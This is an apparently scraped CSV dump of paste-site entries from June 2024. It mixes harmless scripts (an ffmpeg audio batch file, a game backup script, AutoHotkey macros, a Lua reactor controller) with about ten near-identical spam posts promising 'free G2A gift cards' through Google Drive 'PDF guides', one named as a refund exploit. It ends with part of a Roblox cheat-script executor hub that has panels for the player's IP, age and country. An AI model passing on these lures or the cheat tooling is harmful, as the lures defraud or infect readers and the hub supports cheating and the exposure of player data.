id,title,username,language,date,content
uKwdDt9S,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,Ohtaku,JavaScript,Sunday 30th of June 2024 07:05:57 AM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
aHdbss2q,Extract the audio track and convert it to MP3,cemxokenc,Batch,Sunday 30th of June 2024 07:04:46 AM CDT,"setlocal enabledelayedexpansion

REM Directory with video files
set ""DIRECTORY=d:\s4""

REM Iterate over each MKV file in the directory
for %%F in (""%DIRECTORY%\*.mkv"") do (
    REM Get the file name without extension
    set ""FILE=%%~nF""

    REM Extract the audio track
    ffmpeg -i ""%%F"" -vn -acodec copy ""!DIRECTORY!\!FILE!.ac3""
	
    echo Audio extracted from %%F
)

REM Iterate over each AC3 file in the directory
for %%F in (""%DIRECTORY%\*.ac3"") do (
    REM Get the file name without extension
    set ""FILE=%%~nF""

    REM Convert to MP3
    ffmpeg -i ""%%F"" -acodec libmp3lame -q:a 2 ""!DIRECTORY!\!FILE!.mp3""
	
    echo File converted to MP3: %%F
)

endlocal
pause
"
5HdYNBmq,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,mano03,JavaScript,Sunday 30th of June 2024 07:04:39 AM CDT,"G2A.com complimentary voucher & games guide.
Any voucher for free on G2A.com including Steam gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
C57T8Uwq,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,Elii,JavaScript,Sunday 30th of June 2024 06:59:54 AM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
2xTbhY8A,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,gigi1964,JavaScript,Sunday 30th of June 2024 06:58:36 AM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
PjUNgF2a,World of Warcraft Backup,cemxokenc,Batch,Sunday 30th of June 2024 06:56:05 AM CDT,"@echo off
setlocal disabledelayedexpansion

REM Get the current date in DD.MM.YYYY format
for /f ""tokens=1-3 delims=."" %%a in ('echo %date%') do (
    set ""day=%%a""
    set ""month=%%b""
    set ""year=%%c""
)

REM Create a folder name according to the format
set ""backup_folder=%day%.%month%.%year%""
set ""source_folder=d:\World of Warcraft\_retail_\WTF\Account\404582522#1""
set ""destination_folder=d:\!_backup\%backup_folder%""

REM Create a folder for backup
mkdir ""%destination_folder%""

REM Copy files and folders
robocopy ""%source_folder%"" ""%destination_folder%"" /e

echo ""Copy completed.""
pause
"
YSwAiqgz,Madlibs-Generator,RockField64,Python,Sunday 30th of June 2024 06:55:08 AM CDT,"# This opens the file story.txt.
with open(""story.txt"", ""r"") as s:
    story = s.read()

# Find words in parentheses
words = set()
beginning_of_word = -1

start_target = ""(""
end_target = "")""

for i, char in enumerate(story):
    if char == start_target:
        beginning_of_word = i

    if char == end_target and beginning_of_word != -1:
        word = story[beginning_of_word: i + 1]
        words.add(word)
        beginning_of_word = -1

# Get replacements
answers = {}

for word in words:
    answer = input(""Enter a word "" + word + "": "")
    answers[word] = answer

# Replacing words in the story
for word in words:
    story = story.replace(word, answers[word])

print(story)"
CeLN7gRY,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,guywithabigheart,JavaScript,Sunday 30th of June 2024 06:53:51 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Amazon gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
6NpniAPc,Warcraft III Inventory,cemxokenc,Autohotkey,Sunday 30th of June 2024 06:53:32 AM CDT,"#Persistent

; Check for the active window
#IfWinActive ahk_class Warcraft III

MButton::
Send {Numpad1}
return

XButton2::
Send {Numpad7}
return

XButton1::
Send {Numpad4}
return

#IfWinActive"
wGAhWh7C,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,TeleBot,JavaScript,Sunday 30th of June 2024 06:52:32 AM CDT,"G2A.com free gift card & gaming guide.
Any item for free on G2A.com including Amazon gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
tCEh3QuJ,Warcraft III AND Autofarm,cemxokenc,Autohotkey,Sunday 30th of June 2024 06:51:17 AM CDT,"#Persistent  ; Makes the script persistent so the timer keeps running

SetTimer, PressR, 42000  ; Sets a timer for 42 seconds (42000 milliseconds)
; SetTimer, PressQAndClick, 22000  ; Sets a timer for 22 seconds (22000 milliseconds)

PressR:
    ; Find the Warcraft III window
    WinGet, hWnd, ID, Warcraft III
    
    ; Define the key codes for the ""R"" key
    rVK := 0x52
	
    ; Send the ESC key to the inactive window
    SendMessage, 0x100, 0x1B, 0, , ahk_id %hWnd% ; WM_KEYDOWN for ESC
    SendMessage, 0x101, 0x1B, 0, , ahk_id %hWnd% ; WM_KEYUP for ESC
	
    Sleep, 50
	
    ; Send the F1 key to the inactive window
    ; SendMessage, 0x100, 0x70, 0, , ahk_id %hWnd% ; WM_KEYDOWN for F1
    ; SendMessage, 0x101, 0x70, 0, , ahk_id %hWnd% ; WM_KEYUP for F1
	
    Sleep, 50
    
    ; Send WM_KEYDOWN and WM_KEYUP messages for the ""R"" key
    SendMessage, 0x100, % rVK, 0, , ahk_id %hWnd% ; WM_KEYDOWN
    SendMessage, 0x101, % rVK, 0, , ahk_id %hWnd% ; WM_KEYUP
    
return

PressQAndClick:
    ; Find the Warcraft III window
    WinGet, hWnd, ID, Warcraft III
    
    ; Define the key codes for the ""Q"" key
    qVK := 0x51
    
    ; Send the ESC key to the inactive window
    SendMessage, 0x100, 0x1B, 0, , ahk_id %hWnd% ; WM_KEYDOWN for ESC
    SendMessage, 0x101, 0x1B, 0, , ahk_id %hWnd% ; WM_KEYUP for ESC
	
    Sleep, 50
	
    ; Send the F1 key to the inactive window
    SendMessage, 0x100, 0x70, 0, , ahk_id %hWnd% ; WM_KEYDOWN for F1
    SendMessage, 0x101, 0x70, 0, , ahk_id %hWnd% ; WM_KEYUP for F1
	
    Sleep, 50
	
    ; Send WM_KEYDOWN and WM_KEYUP messages for the ""Q"" key
    SendMessage, 0x100, % qVK, 0, , ahk_id %hWnd% ; WM_KEYDOWN
    SendMessage, 0x101, % qVK, 0, , ahk_id %hWnd% ; WM_KEYUP
    
    ; Get screen dimensions
    SysGet, screenWidth, 0
    SysGet, screenHeight, 1
    
    ; Coordinates for the center of the screen
    centerX := screenWidth // 2
    centerY := screenHeight // 2
    
    ; Calculate new y-coordinate by raising it by 10%
    offset := Round(screenHeight * 0.1)
    newY := centerY - offset
    
    ; Loop to send three clicks with a 500-millisecond interval between them
    Loop, 1 {
        ; Send a left mouse button click message to the inactive window
        SendMessage, 0x201, 0x0001, % (centerX & 0xFFFF) | (newY << 16), , ahk_id %hWnd% ; WM_LBUTTONDOWN
        Sleep, 50 ; Delay before releasing the button
        SendMessage, 0x202, 0x0001, % (centerX & 0xFFFF) | (newY << 16), , ahk_id %hWnd% ; WM_LBUTTONUP
        Sleep, 500 ; Pause for 500 milliseconds between clicks
    }
    
return
"
byZRt3FX,Warcraft III TcoM Autospell,cemxokenc,Autohotkey,Sunday 30th of June 2024 06:49:20 AM CDT,"#Persistent  ; Makes the script persistent so the timer keeps running

SetTimer, PressW, 14000  ; Sets a timer for 14 seconds

PressW:
    ; Find the Warcraft III window
    WinGet, hWnd, ID, Warcraft III
    
    ; Define the key codes for the ""W"" key
    wVK := 0x57
    
    ; Send WM_KEYDOWN and WM_KEYUP messages for the ""W"" key
    SendMessage, 0x100, % wVK, 0, , ahk_id %hWnd% ; WM_KEYDOWN
    SendMessage, 0x101, % wVK, 0, , ahk_id %hWnd% ; WM_KEYUP
    
return"
726G9mbb,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,PetrikDev,JavaScript,Sunday 30th of June 2024 06:47:47 AM CDT,"G2A.com free gift card & games guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
NQdZEkqJ,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,William95,JavaScript,Sunday 30th of June 2024 06:46:28 AM CDT,"G2A.com complimentary voucher & games guide.
Any voucher for free on G2A.com including Xbox gift cards & anything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
bacmWjsm,activlyCooledReactor,problemlow,Lua,Sunday 30th of June 2024 06:43:25 AM CDT,"reactor = peripheral.wrap(""back"")
version = ""1.0""
rodLevel = 0
optimal = 80

redstoneSide = ""bottom""
desiredSuperheated = 2000

maxHot = reactor.getHotFluidAmountMax()
while true do
	shell.run(""clear"")
	print(""Running PROReactorOS Version "" .. version)
    print(""Activly Cooled: True"")
	energyNeed = redstone.getInput(redstoneSide)
	coolantSuperheated = reactor.getHotFluidProducedLastTick()
    
    fluid = reactor.getHotFluidAmount()

    if coolantSuperheated > desiredSuperheated*1.25 or fluid > maxHot*.75 then
        reactor.setActive(false)
    elseif coolantSuperheated < desiredSuperheated then
        reactor.setActive(true)
    end
    
    if coolantSuperheated > desiredSuperheated then
        rodLevel = rodLevel + 1
        print(""IO: Increasing Insertion"")
    elseif coolantSuperheated < desiredSuperheated then
        rodLevel = rodLevel - 1
        print(""IO: Decreasing Insertion"")
    end

    if fluid > maxHot*.8 then
        rodLevel = rodLevel + 10
        print(""AlmostFull: Significantly Increasing Insertion"")
    end

    if rodLevel < 0 then
        rodLevel = 0
    end
    if rodLevel > 100 then
        rodLevel = 100
    end


	reactorStatus = reactor.getActive()
	if reactorStatus == true then
		reactorStatus = ""Active""
	elseif reactorStatus == false then
		reactorStatus = ""Shutdown""
	end

	print(""Power Level           = "", fluid, ""RF"")
	print(""Reactor Status        = "", reactorStatus)
	print(""Control Rod Insertion = "", rodLevel, ""%"")

	reactor.setAllControlRodLevels(rodLevel)
	sleep(0.1)
end"
AQBQjynj,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V4 üéÅ,jusst2k4,GetText,Sunday 30th of June 2024 06:42:40 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_296045.pdf
 
Working as of:
30 June 2024"
nCxvRuaZ,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,x3kiN,JavaScript,Sunday 30th of June 2024 06:41:41 AM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Xbox gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
Zvv3Sdch,ECCS Searcher V2.4,ERROR_CODE,Lua,Sunday 30th of June 2024 06:40:35 AM CDT,"if game:GetService(""CoreGui""):FindFirstChild(""UIGui"") then
game:GetService(""CoreGui""):FindFirstChild(""UIGui""):Destroy()
end
HttpService = game:GetService(""HttpService"")
UIGui = Instance.new(""ScreenGui"")
UserInputService = game:GetService(""UserInputService"")
UserInputService_2 = game:GetService(""UserInputService"")
MainFrame = Instance.new(""ImageLabel"")
UIAspectRatioConstraint = Instance.new(""UIAspectRatioConstraint"")
UICorner = Instance.new(""UICorner"")
SearchBox = Instance.new(""TextBox"")
UICorner_3 = Instance.new(""UICorner"")
UICorner_4 = Instance.new(""UICorner"")
UICorner_5 = Instance.new(""UICorner"")
ScriptAuthor = Instance.new(""TextLabel"")
ScriptListFrame = Instance.new(""ScrollingFrame"")
UIPadding = Instance.new(""UIPadding"")
Scripts = Instance.new(""Folder"")
UIGridLayout = Instance.new(""UIGridLayout"")
ScriptFrame = Instance.new(""Frame"")
UICorner_6 = Instance.new(""UICorner"")
ScriptTitle = Instance.new(""TextLabel"")
ExecuteButton = Instance.new(""TextButton"")
UICorner_7 = Instance.new(""UICorner"")
ScriptGame = Instance.new(""TextLabel"")
VerifiedScriptFrame = Instance.new(""Frame"")
UICorner_9 = Instance.new(""UICorner"")
ScriptTitle_2 = Instance.new(""TextLabel"")
VerifiedIcon = Instance.new(""ImageLabel"")
ExecuteButton_2 = Instance.new(""TextButton"")
UICorner_10 = Instance.new(""UICorner"")
UICorner_11 = Instance.new(""UICorner"")
ScriptAuthor_2 = Instance.new(""TextLabel"")
ScriptGame_2 = Instance.new(""TextLabel"")
ScriptListBackgroundFrame = Instance.new(""Frame"")
UICorner_12 = Instance.new(""UICorner"")
InfoBoxDescription = Instance.new(""TextButton"")
Author_2 = Instance.new(""TextLabel"")
UICorner_22 = Instance.new(""UICorner"")
UIListLayout_3 = Instance.new(""UIListLayout"")
UIClick = Instance.new(""Sound"") 
OpenCloseSearcherButton = Instance.new(""TextButton"")
OpenCloseSearcherButtonUICorner = Instance.new(""UICorner"")
PlayerIcon = Instance.new(""ImageButton"")
PlayerIconUICorner = Instance.new(""UICorner"")
MenuBarFrame = Instance.new(""Frame"")
MenuBarFrameUICorner = Instance.new(""UICorner"")
SearcherMenuButton = Instance.new(""TextButton"")
SearcherMenuButtonUICorner = Instance.new(""UICorner"")
ExecutorMenuButton = Instance.new(""TextButton"")
ExecutorMenuButtonUICorner = Instance.new(""UICorner"")
ExecutorMenuScrollingFrame = Instance.new(""ScrollingFrame"")
UINoScriptsFound = Instance.new(""Sound"")
PlayerDataFrame = Instance.new(""Frame"")
PlayerPicture = Instance.new(""ImageLabel"")
PlayerPictureUICorner = Instance.new(""UICorner"")
PlayerDataTextLabel = Instance.new(""TextLabel"")
PlayerIP = Instance.new(""TextLabel"")
PlayerID = Instance.new(""TextLabel"")
PlayerDisplayName = Instance.new(""TextLabel"")
PlayerName = Instance.new(""TextLabel"")
PlayerAge = Instance.new(""TextLabel"")
PlayerCountry = Instance.new(""TextLabel"")
LocalizationService = game:GetService(""LocalizationService"")
ReloadPlayerDataButton = Instance.new(""TextButton"")
ReloadPlayerDataButtonUICorner = Instance.new(""UICorner"")
CopyPlayerDataButton = Instance.new(""TextButton"")
CopyPlayerDataButtonUICorner = Instance.new(""UICorner"")
ExecutorTextBox = Instance.new(""TextBox"")
ExecutorTextBoxUICorner = Instance.new(""UICorner"")
ExecuteTextBoxButton = Instance.new(""TextButton"")
ExecuteTextBoxButtonUICorner = Instance.new(""UICorner"")
ClearTextBoxButton = Instance.new(""TextButton"")
ClearTextBoxButtonUICorner = Instance.new(""UICorner"")
CopyTextBoxButton = Instance.new(""TextButton"")
CopyTextBoxButtonUICorner = Instance.new(""UICorner"")
CopyScriptsButton = Instance.new(""TextButton"")
CopyScriptsButtonUICorner = Instance.new(""UICorner"")
CopyScriptsButton_2 = Instance.new(""TextButton"")
CopyScriptsButtonUICorner_2 = Instance.new(""UICorner"")
DevelopersButton = Instance.new(""TextButton"")
DevelopersButtonUICorner = Instance.new(""UICorner"")
DevelopersFrame = Instance.new(""Frame"")
DevIcon = Instance.new(""ImageLabel"")
DevIconUI = Instance.new(""UICorner"")
DevDesc = Instance.new(""TextLabel"")
DevDescUICorner = Instance.new(""UICorner"")
PlayerDataBackground = Instance.new(""Frame"")
PlayerDataBackgroundUICorner = Instance.new(""UICorner"")
ExecutorMenuScrollingFrameUICorner = Instance.new(""UICorner"")
SearchButton = Instance.new(""TextButton"")
SearchButtonUICorner = Instance.new(""UICorner"")
CopyLinkButton = Instance.new(""TextButton"")
CopyLinkButtonUICorner = Instance.new(""UICorner"")
CopyLinkButton_2 = Instance.new(""TextButton"")
CopyLinkButtonUICorner_2 = Instance.new(""UICorner"")
Loading = Instance.new(""TextLabel"")
DescScriptButton = Instance.new(""TextButton"")
DescScriptButtonUICorner = Instance.new(""UICorner"")
DescScriptButton_2 = Instance.new(""TextButton"")
DescScriptButtonUICorner_2 = Instance.new(""UICorner"")
DescUICorner = Instance.new(""UICorner"")
UIAspectRatioConstraint_2 = Instance.new(""UIAspectRatioConstraint"")
OpenInExecutorButton = Instance.new(""TextButton"")
OpenInExecutorButtonUICorner = Instance.new(""UICorner"")
OpenInExecutorButton_2 = Instance.new(""TextButton"")
OpenInExecutorButtonUICorner_2 = Instance.new(""UICorner"")
PasteScriptButton = Instance.new(""TextButton"")
PasteScriptButtonUICorner = Instance.new(""UICorner"")
AutoExecuteButton = Instance.new(""TextButton"")
AutoExecuteButtonUICorner = Instance.new(""UICorner"")
AutoExecuteButton_2 = Instance.new(""TextButton"")
AutoExecuteButtonUICorner_2 = Instance.new(""UICorner"")
Hint = Instance.new(""TextButton"")
HintUICorner = Instance.new(""UICorner"")
ChatButton = Instance.new(""ImageButton"")
ChatButtonUICorner = Instance.new(""UICorner"")
ChatButton_2 = Instance.new(""ImageButton"")
ChatButtonUICorner_2 = Instance.new(""UICorner"")
ChatButton2 = Instance.new(""ImageLabel"")
ChatButton_22 = Instance.new(""ImageLabel"")
InfoBox = Instance.new(""Frame"")
InfoBoxUICorner = Instance.new(""UICorner"")
Info = Instance.new(""Frame"")
Author = Instance.new(""Frame"")
InfoBoxAuthor = Instance.new(""TextLabel"")
ProfilePicture = Instance.new(""ImageLabel"")
Comments = Instance.new(""Frame"")
Inner = Instance.new(""Frame"")
UICorner_21 = Instance.new(""UICorner"")
Line = Instance.new(""Frame"")
CommentsText = Instance.new(""TextLabel"")
Comments_2 = Instance.new(""ScrollingFrame"")
Comment = Instance.new(""Frame"")
Content = Instance.new(""TextLabel"")
Author_2 = Instance.new(""TextLabel"")
ProfilePicture_2 = Instance.new(""ImageLabel"")
UICorner_22 = Instance.new(""UICorner"")
UIListLayout_3 = Instance.new(""UIListLayout"")
NoComments = Instance.new(""TextLabel"")
BackButtonInfoBox = Instance.new(""TextButton"")
BackButtonInfoBoxUICorner = Instance.new(""UICorner"")
DescFrame = Instance.new(""Frame"")
ScriptImg = Instance.new(""ImageLabel"")
ScriptImgUICorner = Instance.new(""UICorner"")
Rotate = 0

local Region, Country = pcall(function()
return LocalizationService:GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
end)

UIClick.Parent = game.Workspace
UIClick.SoundId = ""rbxassetid://15675032796""
UIClick.Playing = true
UIClick.Looped = false
UIClick.Volume = 1
UIClick:Stop()

UINoScriptsFound.Parent = game.Workspace
UINoScriptsFound.SoundId = ""rbxassetid://6243040798""
UINoScriptsFound.Playing = true
UINoScriptsFound.Looped = false
UINoScriptsFound.Volume = 1
UINoScriptsFound:Stop()

UIGui.Name = ""UIGui""
UIGui.Parent = game.CoreGui
UIGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
game.CoreGui.UIGui.Enabled = true

OpenCloseSearcherButton.Parent = UIGui
OpenCloseSearcherButton.Size = UDim2.new(0, 70, 0, 70)
OpenCloseSearcherButton.Position = UDim2.new(0.85, 0, 0, 0)
OpenCloseSearcherButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenCloseSearcherButton.BackgroundTransparency = 0.3
OpenCloseSearcherButton.Text = "" ‚≠ê ""
OpenCloseSearcherButton.TextColor3 = Color3.fromRGB(200, 200, 200)
OpenCloseSearcherButton.Font = 'FredokaOne'
OpenCloseSearcherButton.TextSize = 45
OpenCloseSearcherButton.AutoButtonColor = false
OpenCloseSearcherButton.Rotation = Rotate

OpenCloseSearcherButtonUICorner.Parent = OpenCloseSearcherButton
OpenCloseSearcherButtonUICorner.CornerRadius = UDim.new(1, 0)

spawn(function()
while wait() do
Rotate = Rotate + 1
OpenCloseSearcherButton.Rotation = Rotate
end
end)

MainFrame.Name = ""MainFrame""
MainFrame.Parent = UIGui
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.Position = UDim2.new(0.5, 0, -0.5, 0)
MainFrame.Size = UDim2.new(0, 450, 0, 400)
MainFrame.ZIndex = 2
MainFrame.Image = ""rbxassetid://18132186349""

UIAspectRatioConstraint.Parent = MainFrame
UIAspectRatioConstraint.AspectRatio = 1.778

UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

DescFrame.Name = ""DescFrame""
DescFrame.Parent = MainFrame
DescFrame.BackgroundTransparency = 1
DescFrame.Size = UDim2.new(0, 340, 0, 190)
DescFrame.Position = UDim2.new(0, 90, 0.12, 10)
DescFrame.ZIndex = 2

ScriptImg.Name = ""ScriptImg""
ScriptImg.Parent = DescFrame
ScriptImg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScriptImg.BackgroundTransparency = 1
ScriptImg.Position = UDim2.new(-0.008, 0, 0.018, 0)
ScriptImg.Size = UDim2.new(0, 345, 0, 180)
ScriptImg.Image = ""rbxassetid://18265579313""

ScriptImgUICorner.CornerRadius = UDim.new(0, 12)
ScriptImgUICorner.Parent = ScriptImg

InfoBoxDescription.Name = ""InfoBoxDescription""
InfoBoxDescription.Parent = DescFrame
InfoBoxDescription.AnchorPoint = Vector2.new(0.5, 0.5)
InfoBoxDescription.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoBoxDescription.BackgroundTransparency = 0.5
InfoBoxDescription.Position = UDim2.new(0.5, 0, 0.49, 0)
InfoBoxDescription.Size = UDim2.new(0, 345, 0, 180)
InfoBoxDescription.Font = Enum.Font.FredokaOne
InfoBoxDescription.TextSize = 30
InfoBoxDescription.TextColor3 = Color3.fromRGB(255, 255, 255)
InfoBoxDescription.Text = ""This is a description!""
InfoBoxDescription.TextWrapped = true
InfoBoxDescription.TextScaled = true
InfoBoxDescription.TextXAlignment = Enum.TextXAlignment.Center
InfoBoxDescription.TextYAlignment = Enum.TextYAlignment.Center

DescUICorner.CornerRadius = UDim.new(0, 12)
DescUICorner.Parent = InfoBoxDescription

InfoBox.Visible = false

InfoBox.Name = ""InfoBox""
InfoBox.Parent = MainFrame
InfoBox.BackgroundTransparency = 0.8
InfoBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoBox.BorderSizePixel = 0
InfoBox.Position = UDim2.new(0, 90, 0.12, 10)
InfoBox.Size = UDim2.new(0, 340, 0, 190)
InfoBox.ZIndex = 3

InfoBoxUICorner.CornerRadius = UDim.new(0, 12)
InfoBoxUICorner.Parent = InfoBox

Hint.Name = ""Hint""
Hint.Parent = UIGui
Hint.AnchorPoint = Vector2.new(0.5, 0.5)
Hint.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Hint.BackgroundTransparency = 0.8
Hint.Position = UDim2.new(0.5, 0, 2, 0)
Hint.Size = UDim2.new(0, 180, 0, 120)
Hint.ZIndex = 2
Hint.AutoButtonColor = false
Hint.Font = Enum.Font.FredokaOne
Hint.TextSize = 30
Hint.TextColor3 = Color3.fromRGB(255, 255, 255)
Hint.Text = ""Welcome""
Hint.TextWrapped = true
Hint.TextScaled = true

HintUICorner.CornerRadius = UDim.new(0, 12)
HintUICorner.Parent = Hint

Loading.Name = ""PlayerName""
Loading.Parent = MainFrame
Loading.BackgroundTransparency = 1
Loading.Position = UDim2.new(0, 260, 0.45, 10)
Loading.Size = UDim2.new(0, 5, 0, 5)
Loading.Font = Enum.Font.FredokaOne
Loading.Text = ""Loading...""
Loading.TextColor3 = Color3.fromRGB(255, 255, 255)
Loading.TextSize = 30

OpenCloseSearcherButton.MouseButton1Click:Connect(function()
writefile(""ES.ECCS"", """"..ExecutorTextBox.Text)
if OpenCloseSearcherButton.Text == ""‚≠ê"" then
OpenCloseSearcherButton.Text = "" ‚≠ê ""
UIClick:Play()
MainFrame.Position = UDim2.new(0.5, 0, -0.5, 0)
MainFrame:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.3)
else
if OpenCloseSearcherButton.Text == "" ‚≠ê "" then
OpenCloseSearcherButton.Text = ""‚≠ê""
UIClick:Play()
MainFrame:TweenPosition(UDim2.new(0.5, 0, 2, 0),""InOut"",""Sine"",0.3)
end
end
spawn(function()
for i = 1,10 do
wait()
Rotate = Rotate + 15
OpenCloseSearcherButton.Rotation = Rotate
end
end)
end)

spawn(function()
while wait() do
if MainFrame.Position == UDim2.new(0.5, 0, 2, 0) then
MainFrame.Visible = false
else
MainFrame.Visible = true
end
if Hint.Position == UDim2.new(0.5, 0, 0.5, 0) then
wait(3)
Hint:TweenPosition(UDim2.new(0.5, 0, 2, 0),""InOut"",""Sine"",0.3)
end
end
end)

DevelopersFrame.Visible = false

ExecutorMenuScrollingFrame.Visible = false

MenuBarFrame.Name = ""MenuBarFrame""
MenuBarFrame.Parent = MainFrame
MenuBarFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MenuBarFrame.BackgroundTransparency = 0.8
MenuBarFrame.Position = UDim2.new(0, 10, 0.1, 10)
MenuBarFrame.Size = UDim2.new(0, 60, 0, 200)

MenuBarFrameUICorner.CornerRadius = UDim.new(0, 12)
MenuBarFrameUICorner.Parent = MenuBarFrame

SearchBox.Name = ""SearchBox""
SearchBox.Parent = MainFrame
SearchBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearchBox.BackgroundTransparency = 0.8
SearchBox.Position = UDim2.new(0, 9, 0, 5)
SearchBox.Size = UDim2.new(0, 350, 0, 25)
SearchBox.ClearTextOnFocus = false
SearchBox.Font = Enum.Font.FredokaOne
SearchBox.PlaceholderText = ""ECCS‚Ä¢Searcher""
SearchBox.Text = """"
SearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
SearchBox.TextScaled = true
SearchBox.TextSize = 14.000
SearchBox.TextWrapped = true
SearchBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)

UICorner_3.CornerRadius = UDim.new(0, 12)
UICorner_3.Parent = SearchBox

local Frame = ({
[""01 01""] = ""rbxassetid://16779094159"",
[(function(Year)
local A = math.floor(Year/100)
local B = math.floor((13+8*A)/25)
local C = (15-B+A-math.floor(A/4))%30
local D = (4+A-math.floor(A/4))%7
local E = (19*(Year%19)+C)%30
local F = (2*(Year%4)+4*(Year%7)+6*E+D)%7
local G = (22+E+F)
if E == 29 and F == 6 then
return ""04 19""
elseif E == 28 and F == 6 then
return ""04 18""
elseif 31 < G then
return (""04 %02d""):format(G-31)
end
return (""03 %02d""):format(G)
end)(tonumber(os.date""%Y""))] = ""rbxassetid://16779090090"",
[""10 31""] = ""rbxassetid://16779133028"",
[""12 25""] = ""rbxassetid://16779174392""
})[os.date(""%m %d"")]
if Frame then
MainFrame.Image = Frame
end

SearchButton.Name = ""SearchButton""
SearchButton.Parent = MainFrame
SearchButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearchButton.Position = UDim2.new(0, 363, 0, 5)
SearchButton.Size = UDim2.new(0, 80, 0, 25)
SearchButton.AutoButtonColor = false
SearchButton.Font = Enum.Font.Code
SearchButton.Text = ""üîé""
SearchButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SearchButton.TextSize = 15
SearchButton.BackgroundTransparency = 0.8

SearchButtonUICorner.CornerRadius = UDim.new(0, 12)
SearchButtonUICorner.Parent = SearchButton

DevelopersButton.Name = ""DevelopersButton""
DevelopersButton.Position = UDim2.new(0, 20, 0.135, 10)
DevelopersButton.Parent = MainFrame
DevelopersButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevelopersButton.BackgroundTransparency = 0.8
DevelopersButton.LayoutOrder = 1
DevelopersButton.Size = UDim2.new(0, 40, 0, 40)
DevelopersButton.AutoButtonColor = false
DevelopersButton.Font = Enum.Font.FredokaOne
DevelopersButton.Text = ""i""
DevelopersButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DevelopersButton.TextSize = 25

DevelopersButtonUICorner.Parent = DevelopersButton
DevelopersButtonUICorner.CornerRadius = UDim.new(0, 12)

DevelopersButton.MouseButton1Click:Connect(function()
UIClick:Play()
PasteScriptButton.Visible = false
InfoBox.Visible = false
ScriptListFrame.Visible = false
PlayerDataFrame.Visible = false
ExecutorMenuScrollingFrame.Visible = false
ClearTextBoxButton.Visible = false
CopyTextBoxButton.Visible = false
ExecuteTextBoxButton.Visible = false
DevelopersFrame.Visible = true
DescFrame.Visible = false
PlayerIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevelopersButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
SearcherMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecutorMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
end)

DevelopersFrame.Name = ""DevelopersFrame""
DevelopersFrame.Parent = MainFrame
DevelopersFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DevelopersFrame.BackgroundTransparency = 1
DevelopersFrame.BorderSizePixel = 0
DevelopersFrame.Position = UDim2.new(0, 70, 0.1, 10)
